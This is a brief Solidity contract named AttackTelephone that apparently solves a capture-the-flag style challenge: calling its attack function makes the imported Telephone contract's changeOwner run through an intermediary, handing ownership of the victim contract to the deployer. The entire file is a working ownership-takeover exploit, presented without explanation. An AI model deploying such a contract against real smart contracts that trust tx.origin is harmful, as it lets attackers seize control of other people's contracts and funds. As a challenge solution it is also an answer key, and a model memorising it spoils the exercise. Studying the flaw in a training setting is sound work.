// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract AttackTelephone {

    Telephone telephone;
    address public owner;

    constructor(address _victimAddress) {
        owner = msg.sender;
        telephone = Telephone(_victimAddress);
    }

    function attack() public {
        telephone.changeOwner(owner);
    }
}
